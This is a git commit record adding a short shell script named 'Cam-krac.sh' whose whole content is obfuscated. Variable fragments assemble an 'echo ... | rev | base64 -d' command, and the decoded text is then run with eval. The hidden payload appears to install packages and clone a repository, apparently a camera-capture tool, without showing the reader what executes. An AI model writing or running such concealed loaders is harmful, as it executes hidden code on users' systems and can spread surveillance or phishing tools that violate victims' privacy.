af060e82c7218bee6f601b45d7cc1fb05df67cd6
luisakrac <50025904+luisakrac@users.noreply.github.com>
2019-06-18 05:03:56 -0500

    Add files via upload

---
+++ Cam-krac.sh
@@ -0,0 +1,4 @@
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogCyFWZsNmCoNnLlNXZlh2Y5F2cvU2clVGajlXYz9SZt9GavMXZslmZvgXdtJXZ05SbvN2LhRXYk9SY0FGZvAiKgg3KgQ2bth2YKQXan5SZzVWZoNWehN3LlNWavh2Y4VnbpxWZoR3Lt92YuIWdoRXan9yL6MHc0RHagUmbvx2YgQXanpgC51CIwhGcgwGbhR3culGI0BXYKkXLgg2cz5WZw9GIsxWY0NnbpBCdwFmC51CI0l2ZgwGbhR3culGI0BXYKkXLgUGZhJ3ZwVHI0BXYgYiJgUGdhRGc1BCdwFmCoNXYiBCbsFGdz5Wagc2awpAdpdGIsxWY0NnbpByZrBnCKg2chJ2LulmYvEyI
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
